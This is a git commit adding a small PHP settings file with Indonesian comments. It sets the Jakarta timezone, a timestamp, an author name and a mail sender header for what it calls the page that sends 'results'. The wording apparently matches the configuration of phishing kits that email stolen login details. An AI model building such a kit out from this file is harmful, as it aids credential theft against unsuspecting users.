c970654e205c6d7b045f3efc53a3069ab4072865
keceners <127976151+keceners@users.noreply.github.com>
2023-03-15 23:30:01 +0700

    Create setting.php

---
+++ system/setting.php
@@ -0,0 +1,8 @@
+<?php
+// KONTROL UNTUK MENDAPATKAN ZONA WAKTU (JAKARTA)
+date_default_timezone_set('Asia/Jakarta');
+$jamasuk = date('l, d-m-Y h:i:s');
+
+// KONTROL UNTUK HALAMAN KIRIM RESULT
+$author = 'YAKOU';
+$sender = 'From: WEB P | Kyn XD <mamahbucin@gmail.com>';
